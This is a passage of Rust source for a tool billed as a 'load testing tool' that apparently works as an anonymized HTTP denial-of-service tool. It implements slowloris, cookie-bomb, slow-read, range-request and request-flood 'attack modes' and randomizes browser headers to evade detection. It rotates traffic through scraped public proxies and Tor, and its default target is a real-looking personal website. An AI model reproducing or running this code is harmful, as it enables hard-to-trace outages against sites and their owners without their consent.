use std::sync::Arc;
use std::time::{Duration, Instant};
use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, AtomicU32, Ordering};
use rand::prelude::*;
use rand::distr::{Distribution, weighted::WeightedIndex};
use regex::Regex;
use reqwest::{Client, RequestBuilder};
use reqwest::header::{HeaderMap, SET_COOKIE};
use scraper::{Html, Selector};
use tokio::sync::{Mutex, Semaphore};
use url::Url;

const DEFAULT_TARGET_URL: &str = "https://livdevries.com";

#[allow(dead_code)]
#[derive(Clone, Debug)]
struct ClientConfig {
    pinned_dns: Option<(String, std::net::IpAddr)>,
    pool_max_idle: usize,
    pool_idle_timeout: Duration,
    sni: Option<String>,
}

impl Default for ClientConfig {
    fn default() -> Self {
        ClientConfig {
            pinned_dns: None,
            pool_max_idle: 20,
            pool_idle_timeout: Duration::from_secs(90),
            sni: None,
        }
    }
}

struct BrowserProfile {
    ua: &'static str,
    sec_ch_ua: Option<&'static str>,
    platform: Option<&'static str>,
    mobile: &'static str,
}

const BROWSER_PROFILES: &[BrowserProfile] = &[
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"macOS\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.5 Safari/605.1.15", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", sec_ch_ua: Some("\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\""), platform: Some("\"Linux\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0", sec_ch_ua: None, platform: None, mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0", sec_ch_ua: Some("\"Microsoft Edge\";v=\"125\", \"Chromium\";v=\"125\", \"Not-A.Brand\";v=\"24\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 OPR/109.0.0.0", sec_ch_ua: Some("\"Opera\";v=\"109\", \"Chromium\";v=\"124\", \"Not-A.Brand\";v=\"99\""), platform: Some("\"Windows\""), mobile: "?0" },
    BrowserProfile { ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1", sec_ch_ua: None, platform: None, mobile: "?1" },
];

struct BrowserHeaders {
    headers: [(&'static str, &'static str); 15],
    len: usize,
}
impl BrowserHeaders {
    fn random() -> Self {
        let mut rng = rand::rng();
        let profile = &BROWSER_PROFILES[rng.random_range(0..BROWSER_PROFILES.len())];
        let mut headers = [("", ""); 15];
        headers[0] = ("User-Agent", profile.ua);
        headers[1] = ("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8");
        headers[2] = ("Accept-Language", if rng.random_bool(0.33) { "en-GB,en;q=0.9" } else { "en-US,en;q=0.9" });
        headers[3] = ("Accept-Encoding", "gzip, deflate, br");
        headers[4] = ("Cache-Control", "no-cache");
        headers[5] = ("Pragma", "no-cache");
        headers[6] = ("Upgrade-Insecure-Requests", "1");
        headers[7] = ("Sec-Fetch-Dest", "document");
        headers[8] = ("Sec-Fetch-Mode", "navigate");
        headers[9] = ("Sec-Fetch-Site", "none");
        headers[10] = ("Sec-Fetch-User", "?1");
        headers[11] = ("Connection", "keep-alive");
        
        let mut len = 12;
        if let Some(v) = profile.sec_ch_ua {
            headers[len] = ("Sec-CH-UA", v);
            len += 1;
        }
        if let Some(v) = profile.platform {
            headers[len] = ("Sec-CH-UA-Platform", v);
            len += 1;
        }
        headers[len] = ("Sec-CH-UA-Mobile", profile.mobile);
        len += 1;
        
        for i in (1..len).rev() {
            headers.swap(i, rng.random_range(0..i + 1));
        }
        BrowserHeaders { headers, len }
    }
    fn apply(&self, mut builder: RequestBuilder) -> RequestBuilder {
        for i in 0..self.len {
            let (name, value) = self.headers[i];
            builder = builder.header(name, value);
        }
        builder
    }
}

fn browser_request(builder: RequestBuilder) -> RequestBuilder { BrowserHeaders::random().apply(builder) }

fn print_help() {
    println!("Simulate Load Rust — single-system load testing tool");
    println!("");
    println!("Usage: {} [OPTIONS] [target_url] [mode] [attack_mode] [concurrency] [duration_secs]", env!("CARGO_PKG_NAME"));
    println!("");
    println!("Options:");
    println!("  -h, --help            Show this help");
    println!("  -v, --version         Show version");
    println!("  --list-modes          List available attack modes");
    println!("  --tor-only            Force Tor-only mode (no scraping)");
    println!("  --dry-run             Only probe the domain, exit without load test");
    println!("  --verify              Verify proxies, show alive count, exit without load test");
    println!("  --output CSV          Write results to CSV file");
    println!("  --proxy-file F        Load proxy list from file (one per line or comma-separated)");
    println!("  --tor-proxy URL       Specify custom Tor proxy URL (e.g. socks5://127.0.0.1:9050)");
    println!("  --tor-control ADDR    Specify custom Tor control port address (e.g. 127.0.0.1:9051)");
    println!("  --tor-entry-guards G  Comma-separated entry guards for Tor");
    println!("  --tor-bridges B       Semicolon-separated bridges for Tor");
    println!("  --tor-circuit-timeout S Custom circuit build timeout in seconds");
    println!("  --tor-ssthresh N      Limited slow start concurrency threshold (default: 20)");
    println!("  --delay MS            Per-request delay in milliseconds");
    println!("  --jitter MS           Random delay jitter in milliseconds");
    println!("  --max-errors N        Stop after N failed requests");
    println!("  --save-proxies F      Save discovered proxies to file");
    println!("  --custom-selector SEL Custom CSS selector for proxy scraping");
    println!("  --pool-max-idle N     Max idle connections per host in pool");
    println!("  --pool-idle-timeout S Idle connection timeout in seconds");
    println!("  --sni NAME            Server Name Indication override");
    println!("  --auto-tune           Enable PID controller concurrency auto-tuning");
    println!("  --tui                 Enable interactive console dashboard");
    println!("  --config F            Load configuration from file");
    println!("");
    println!("Modes: scrape, tor, scrape-tor (proxy source)");
    println!("Attack modes: normal, bandwidth, slowread, imageopt, largepost, assetspray,");
    println!("              rangereq, cookiebomb, ssr, middleware, requestflood, notfound, slowloris");
    println!("");
    println!("Examples:");
    println!("  {} --dry-run https://livdevries.com", env!("CARGO_PKG_NAME"));
    println!("  {} https://livdevries.com 2>&1", env!("CARGO_PKG_NAME"));
    println!("  {} https://target.com tor normal 50 60 2>&1", env!("CARGO_PKG_NAME"));
}

fn add_session_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>]) -> RequestBuilder {
    if proxy_idx < sessions.len() {
        let cookie = sessions[proxy_idx].lock().unwrap().clone();
        if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
    }
    builder
}

fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>], extra_cookie: &str) -> RequestBuilder {
    if proxy_idx < sessions.len() {
        let stored = sessions[proxy_idx].lock().unwrap().clone();
        let cookie = if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) };
        builder = builder.header("Cookie", cookie);
    } else {
        builder = builder.header("Cookie", extra_cookie);
    }
    builder
}

fn extract_set_cookie(headers: &HeaderMap) -> Option<String> {
    let cookies: Vec<String> = headers
        .get_all(SET_COOKIE)
        .iter()
        .filter_map(|v| v.to_str().ok())
        .filter_map(|v| v.split(';').next())
        .filter_map(|v| { let trimmed = v.trim(); if !trimmed.is_empty() { Some(trimmed.to_string()) } else { None }})
        .collect();
    if cookies.is_empty() { None } else { Some(cookies.join("; ")) }
}

fn update_session_from_headers(proxy_idx: usize, sessions: &[std::sync::Mutex<String>], headers: &HeaderMap) {
    if proxy_idx < sessions.len() {
        if let Some(cookie) = extract_set_cookie(headers) {
            *sessions[proxy_idx].lock().unwrap() = cookie;
        }
    }
}

fn browser_client_builder(config: &ClientConfig) -> reqwest::ClientBuilder {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(10))
        .pool_max_idle_per_host(config.pool_max_idle)
        .pool_idle_timeout(config.pool_idle_timeout)
        .tcp_nodelay(true);

    if let Some((ref host, ip)) = config.pinned_dns {
        builder = builder.resolve_to_addrs(host, &[
            std::net::SocketAddr::new(ip, 80),
            std::net::SocketAddr::new(ip, 443),
        ]);
    }
    builder
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum ProxyMode { Scrape, Tor, ScrapeTorFallback }
impl std::fmt::Display for ProxyMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self { ProxyMode::Scrape => write!(f, "Scrape"), ProxyMode::Tor => write!(f, "Tor"), ProxyMode::ScrapeTorFallback => write!(f, "Scrape→Tor") }
    }
}

#[derive(Clone, Copy, PartialEq, Debug)]
enum AttackMode { Bandwidth, SlowRead, ImageOpt, LargePost, AssetSpray, RangeReq, CookieBomb, SSR, Middleware, RequestFlood, Normal, NotFound, Slowloris }
impl std::fmt::Display for AttackMode {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            AttackMode::Bandwidth => write!(f, "Bandwidth"),
            AttackMode::SlowRead => write!(f, "Slow Read"),
            AttackMode::ImageOpt => write!(f, "Image Opt"),
            AttackMode::LargePost => write!(f, "Large POST"),
            AttackMode::AssetSpray => write!(f, "Asset Spray"),
            AttackMode::RangeReq => write!(f, "Range Req"),
            AttackMode::CookieBomb => write!(f, "Cookie Bomb"),
            AttackMode::SSR => write!(f, "SSR"),
            AttackMode::Middleware => write!(f, "Middleware"),
            AttackMode::RequestFlood => write!(f, "Request Flood"),
            AttackMode::Normal => write!(f, "Normal"),
            AttackMode::NotFound => write!(f, "404 Storm"),
            AttackMode::Slowloris => write!(f, "Slowloris"),
        }
    }
}

#[allow(dead_code)]
struct ProxyPool {
    clients: Vec<Client>,
    labels: Vec<String>,
    current: usize,
    cooldown_until: Vec<Instant>,
    failure_tier: Vec<u32>,
    succeeded: Vec<bool>,
    is_tor: Vec<bool>,
    weights: Vec<f64>,
    active_indices: Vec<usize>,
    active_weights: Vec<f64>,
}

impl ProxyPool {
    fn new(proxies: &[String], config: &ClientConfig) -> Self {
        let mut clients = Vec::with_capacity(proxies.len());
        let mut labels = Vec::with_capacity(proxies.len());
        let mut is_tor = Vec::with_capacity(proxies.len());
        let mut weights = Vec::with_capacity(proxies.len());
        for u in proxies {
            let url = if u.contains("://") { u.clone() } else { format!("http://{}", u) };
            if let Ok(p) = reqwest::Proxy::all(&url) {
                if let Ok(c) = browser_client_builder(config).proxy(p).build() {
                    clients.push(c);
                    labels.push(url.clone());
                    is_tor.push(url.contains(":isolate@"));
                    weights.push(1.0);
                }
            }
        }
        let n = clients.len();
        ProxyPool {
            clients,
            labels,
            current: 0,
            cooldown_until: vec![Instant::now(); n],
            failure_tier: vec![0; n],
            succeeded: vec![false; n],
            is_tor,
            weights,
            active_indices: Vec::with_capacity(n),
            active_weights: Vec::with_capacity(n),
        }
    }

    fn next(&mut self) -> Option<(usize, Client)> {
        let now = Instant::now();
        self.active_indices.clear();
        self.active_weights.clear();
        for i in 0..self.clients.len() {
            if self.cooldown_until[i] <= now {
                self.active_indices.push(i);
                self.active_weights.push(self.weights[i]);
            }
        }
        if self.active_indices.is_empty() {
            return None;
        }
        let mut rng = rand::rng();
        let first = self.active_weights[0];
        if self.active_weights.iter().all(|&w| w == first) {
            let sample_idx = rng.random_range(0..self.active_indices.len());
            let idx = self.active_indices[sample_idx];
            return Some((idx, self.clients[idx].clone()));
        }
        let dist = WeightedIndex::new(&self.active_weights).ok()?;
        let sample_idx = dist.sample(&mut rng);
        let idx = self.active_indices[sample_idx];
        Some((idx, self.clients[idx].clone()))
    }

    fn report_success(&mut self, idx: usize, latency_ms: u64) {
        if idx < self.clients.len() {
            self.succeeded[idx] = true;
            self.failure_tier[idx] = 0;
            let factor = if latency_ms < 200 {
                1.3
            } else if latency_ms < 600 {
                1.0
            } else if latency_ms < 1500 {
                0.7
            } else {
                0.3
            };
            self.weights[idx] = (self.weights[idx] * 0.85 + 0.15 * factor).clamp(0.01, 3.0);
        }
    }

    fn report_failure(&mut self, idx: usize) {
        if idx < self.clients.len() {
            self.failure_tier[idx] += 1;
            let secs = 2u64.pow(self.failure_tier[idx].min(8)).min(300);
            self.cooldown_until[idx] = Instant::now() + Duration::from_secs(secs);
            self.weights[idx] = (self.weights[idx] * 0.5).max(0.01);
        }
    }
}

const HTML_SRC: &[&str] = &["https://free-proxy-list.net/", "https://www.sslproxies.org/", "https://www.us-proxy.org/", "https://free-proxy-list.net/anonymous-proxy.html", "https://free-proxy-list.net/uk-proxy.html", "https://www.socks-proxy.net/"];
const RAW_SRC: &[&str] = &[
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=https&timeout=10000&country=all","https://proxyspace.pro/https.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt","https://sunny9577.github.io/proxy-scraper/generated/https_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/https.txt","https://vakhov.github.io/fresh-proxy-list/https.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/https/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/https.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/https.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all","https://proxyspace.pro/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt","https://sunny9577.github.io/proxy-scraper/generated/socks5_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/socks5.txt","https://vakhov.github.io/fresh-proxy-list/socks5.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all","https://proxyspace.pro/socks4.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt","https://sunny9577.github.io/proxy-scraper/generated/socks4_proxies.txt","https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/socks4.txt","https://vakhov.github.io/fresh-proxy-list/socks4.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/socks4/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks4.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt","https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all","https://proxyspace.pro/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-Proxy-list/master/http.txt","https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt","https://sunny9577.github.io/proxy-scraper/generated/http_proxies.txt",
    "https://raw.githubusercontent.com/wiki/gfpcom/free-proxy-list/lists/http.txt","https://vakhov.github.io/fresh-proxy-list/http.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/protocols/http/data.txt",
    "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http.txt","https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/proxies/http.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt","https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt","https://cdn.jsdelivr.net/gh/proxifly/free-proxy-list@main/proxies/all/data.txt",
];

fn detect_scheme(url: &str) -> &'static str {
    let url_lower = url.to_lowercase();
    if url_lower.contains("socks5") {
        "socks5"
    } else if url_lower.contains("socks4") {
        "socks4"
    } else if url_lower.contains("socks") {
        "socks5"
    } else {
        "http"
    }
}

async fn scrape_html(c: &Client, url: &str, custom_selector: Option<&str>) -> Vec<String> {
    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let h = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    let doc = Html::parse_document(&h);
    let mut out = vec![];
    if let Some(sel_str) = custom_selector {
        if let Ok(s) = Selector::parse(sel_str) {
            for el in doc.select(&s) {
                let text = el.text().collect::<String>();
                let re = Regex::new(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d+)").unwrap();
                for cap in re.captures_iter(&text) {
                    if cap.len() >= 3 {
                        out.push(format!("{}://{}:{}", scheme, &cap[1], &cap[2]));
                    }
                }
            }
        }
    } else {
        let tr = Selector::parse("table.table tbody tr").unwrap();
        let td = Selector::parse("td").unwrap();
        for row in doc.select(&tr) {
            let cells: Vec<String> = row.select(&td).map(|c| c.text().collect::<String>().trim().to_string()).collect();
            if cells.len() >= 2 {
                let ip = cells[0].trim().to_string();
                let port = cells[1].trim().to_string();
                if !ip.is_empty() && !port.is_empty() {
                    out.push(format!("{}://{}:{}", scheme, ip, port));
                }
            }
        }
    }
    out
}

async fn scrape_raw(c: &Client, url: &str, re: &Regex) -> Vec<String> {
    let scheme = detect_scheme(url);
    let r = match tokio::time::timeout(Duration::from_secs(8), browser_request(c.get(url)).send()).await { Ok(Ok(r)) => r, _ => return vec![] };
    let t = match tokio::time::timeout(Duration::from_secs(8), r.text()).await { Ok(Ok(t)) => t, _ => return vec![] };
    t.lines().filter_map(|l| { let x = l.trim(); if x.is_empty() || x.starts_with('#') || x.starts_with("//") { return None; } re.captures(x).and_then(|c| c.get(1).map(|m| m.as_str().to_string())).map(|ip_port| format!("{}://{}", scheme, ip_port)) }).collect()
}

async fn scrape_all(c: &Client, state: &Arc<Mutex<AppState>>) -> Vec<String> {
    let (max, custom_selector) = {
        let st = state.lock().await;
        (st.max_scrape, st.custom_selector.clone())
    };
    let re = Arc::new(Regex::new(r"(\d{1,3}\.\d{1,3}:\d+)").unwrap());
    let all = Arc::new(Mutex::new(Vec::new())); let sem = Arc::new(Semaphore::new(10)); let done = Arc::new(AtomicBool::new(false));
    let ht = HTML_SRC.len() as u32; let rt = RAW_SRC.len() as u32; let total = ht + rt; state.lock().await.scrape_total = total; let mut handles = vec![];
    let srcs: Vec<(&str, bool)> = HTML_SRC.iter().map(|s| (*s, true)).chain(RAW_SRC.iter().map(|s| (*s, false))).collect();
    for (idx, (src, html)) in srcs.iter().enumerate() {
        if done.load(Ordering::Relaxed) { break; }
        let p = sem.clone().acquire_owned().await.unwrap();
        if done.load(Ordering::Relaxed) { drop(p); break; }
        let s2 = state.clone(); let a2 = all.clone(); let r2 = re.clone(); let c2 = c.clone(); let s_ = src.to_string(); let maxed = done.clone(); let h = *html;
        let sel = custom_selector.clone();
        handles.push(tokio::spawn(async move {
            { let mut st = s2.lock().await; st.scrape_phase = (idx + 1) as u32; st.status_msg = format!("Scraping {} [{}/{}]...", if h {"HTML"} else {"raw"}, idx + 1, total); }
            let p2 = if h { scrape_html(&c2, &s_, sel.as_deref()).await } else { scrape_raw(&c2, &s_, &r2).await };
            let mut a = a2.lock().await; a.extend(p2);
            if a.len() >= max { maxed.store(true, Ordering::Relaxed); }
            drop(a); drop(p);
        }));
    }
    for h in handles { let _ = h.await; }
    let mut r = all.lock().await.clone(); r.sort(); r.dedup(); r.truncate(max);
    state.lock().await.total_scraped = r.len(); state.lock().await.status_msg = format!("Scraped {} unique proxies", r.len()); r
}

async fn tcp_check(addr: &str, timeout: u64) -> bool {
    let a = addr.trim_start_matches("http://").trim_start_matches("https://").trim_start_matches("socks4://").trim_start_matches("socks5://").trim_start_matches("socks://");
    tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(a)).await.ok().and_then(|r| r.ok()).is_some()
}

fn parse_templates(body: &str) -> String {
    let mut result = body.to_string();
    if result.contains("{{random_uuid}}") {
        let uuid = format!("{:08x}-{:04x}-4{:03x}-{:04x}-{:012x}",
            rand::random::<u32>(),
            rand::random::<u16>(),
            rand::random::<u16>() & 0x0fff,
            rand::random::<u16>() & 0x3fff | 0x8000,
            rand::random::<u64>()
        );
        result = result.replace("{{random_uuid}}", &uuid);
    }
    if result.contains("{{timestamp}}") {
        if let Ok(dur) = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH) {
            result = result.replace("{{timestamp}}", &dur.as_secs().to_string());
        }
    }
    if result.contains("{{random_int}}") {
        let num = rand::random::<u32>() % 100000;
        result = result.replace("{{random_int}}", &num.to_string());
    }
    result
}

async fn fetch_page(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let builder = add_session_cookie(browser_request(c.get(&url)), proxy_idx, &sessions);
    let resp = builder.send().await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

async fn fetch_page_with_referrer(
    c: Client,
    url: String,
    referrer: Option<String>,
    delay: u64,
    proxy_idx: usize,
    sessions: Arc<Vec<std::sync::Mutex<String>>>
) -> Result<(usize, u16), reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let mut builder = browser_request(c.get(&url));
    if let Some(ref ref_val) = referrer {
        builder = builder.header("Referer", ref_val);
    }
    let builder = add_session_cookie(builder, proxy_idx, &sessions);
    let resp = builder.send().await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

async fn fetch_range(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let end = 100 + (rand::rng().random_range(0..9000));
    let builder = browser_request(c.get(&url)).header("Range", format!("bytes=0-{}", end))
        .header("Accept", "*/*").header("Cache-Control", "no-cache");
    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let mut total = 0usize;
    let mut stream = resp.bytes_stream();
    use tokio_stream::StreamExt;
    while let Some(chunk) = stream.next().await {
        if let Ok(c) = &chunk { total += c.len(); }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    Ok((total, status))
}

async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let raw_body = "{\"id\":\"{{random_uuid}}\", \"timestamp\": {{timestamp}}, \"value\": {{random_int}}, \"data\":\"xxxxxxxxxx\"}";
    let body = parse_templates(raw_body);
    let builder = browser_request(c.post(&url)).header("Content-Type", "application/json")
        .header("Cache-Control", "no-cache").body(body);
    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    let bomb_payload = "x".repeat(8192);
    let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
        rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
    let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
    let resp = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie).send().await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

async fn fetch_slowloris(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<(usize, u16), reqwest::Error> {
    if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
    use tokio_stream::StreamExt;
    let stream = tokio_stream::wrappers::IntervalStream::new(tokio::time::interval(Duration::from_secs(3)))
        .take(10)
        .map(|_| Ok::<_, std::io::Error>(bytes::Bytes::from("a")));
    let body = reqwest::Body::wrap_stream(stream);
    let builder = browser_request(c.post(&url))
        .header("Content-Type", "application/octet-stream")
        .header("Content-Length", "10")
        .header("Cache-Control", "no-cache")
        .body(body);
    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
    let status = resp.status().as_u16();
    update_session_from_headers(proxy_idx, &sessions, resp.headers());
    let bytes = resp.bytes().await?.len();
    Ok((bytes, status))
}

struct LatencySamples {
    samples: Vec<AtomicU32>,
    idx: AtomicUsize,
}

impl LatencySamples {
    fn new(size: usize) -> Self {
        let mut samples = Vec::with_capacity(size);
        for _ in 0..size {
            samples.push(AtomicU32::new(0));
        }
        LatencySamples {
            samples,
            idx: AtomicUsize::new(0),
        }
    }
    fn record(&self, val: u32) {
        if self.samples.is_empty() { return; }
        let pos = self.idx.fetch_add(1, Ordering::Relaxed) % self.samples.len();
        self.samples[pos].store(val, Ordering::Relaxed);
    }
    fn get_percentiles(&self) -> (u32, u32, u32, u32) {
        let mut res = Vec::new();
        for s in &self.samples {
            let v = s.load(Ordering::Relaxed);
            if v > 0 {
                res.push(v);
            }
        }
        if res.is_empty() {
            return (0, 0, 0, 0);
        }
        res.sort_unstable();
        let len = res.len();
        let p50 = res[len * 50 / 100];
        let p90 = res[len * 90 / 100];
        let p95 = res[len * 95 / 100];
        let p99 = res[len * 99 / 100];
        (p50, p90, p95, p99)
    }
}

#[derive(Clone)]
struct Stats {
    running: Arc<AtomicBool>,
    total_requests: Arc<AtomicU64>,
    total_bytes: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
    total_latency_ms: Arc<AtomicU64>,
    status_2xx: Arc<AtomicU64>,
    status_3xx: Arc<AtomicU64>,
    status_4xx: Arc<AtomicU64>,
    status_5xx: Arc<AtomicU64>,
    status_other: Arc<AtomicU64>,
    latency_samples: Arc<LatencySamples>,
    concurrency: Arc<AtomicUsize>,
}

impl Stats {
    fn new() -> Self {
        Stats {
            running: Arc::new(AtomicBool::new(false)),
            total_requests: Arc::new(AtomicU64::new(0)),
            total_bytes: Arc::new(AtomicU64::new(0)),
            errors: Arc::new(AtomicU64::new(0)),
            total_latency_ms: Arc::new(AtomicU64::new(0)),
            status_2xx: Arc::new(AtomicU64::new(0)),
            status_3xx: Arc::new(AtomicU64::new(0)),
            status_4xx: Arc::new(AtomicU64::new(0)),
            status_5xx: Arc::new(AtomicU64::new(0)),
